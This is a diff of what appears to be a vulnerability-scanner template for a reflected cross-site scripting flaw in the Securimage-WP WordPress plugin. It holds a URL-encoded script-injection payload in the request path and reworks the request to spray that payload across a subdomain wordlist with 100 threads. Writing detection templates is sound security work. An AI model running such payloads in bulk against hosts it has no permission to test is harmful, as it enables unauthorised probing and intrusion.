@@ -4,15 +4,22 @@ info:
   name: WordPress Plugin Securimage-WP - 'siwp_test.php' Reflected Cross-Site Scripting (XSS)
   author: daffainfo
   severity: medium
-  reference:
-    - http://web.archive.org/web/20210123054214/https://www.securityfocus.com/bid/59816/info
+  reference: https://www.securityfocus.com/bid/59816/info
   tags: wordpress,xss,wp-plugin
 
 requests:
-  - method: GET
-    path:
-      - '{{BaseURL}}/wp-content/plugins/securimage-wp/siwp_test.php/%22/%3E%3Cscript%3Ealert(1);%3C/script%3E?tested=1'
+  - payloads:
+      Subdomains: /home/mahmoud/Wordlist/AllSubdomains.txt
+    attack: sniper
+    threads: 100
 
+    raw:
+      - |
+        GET /wp-content/plugins/securimage-wp/siwp_test.php/%22/%3E%3Cscript%3Ealert(1);%3C/script%3E?tested=1 HTTP/1.1
+        Host: {{Subdomains}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0
+        Accept-Encoding: gzip, deflate
+        Accept: */*
     matchers-condition: and
     matchers:
       - type: word
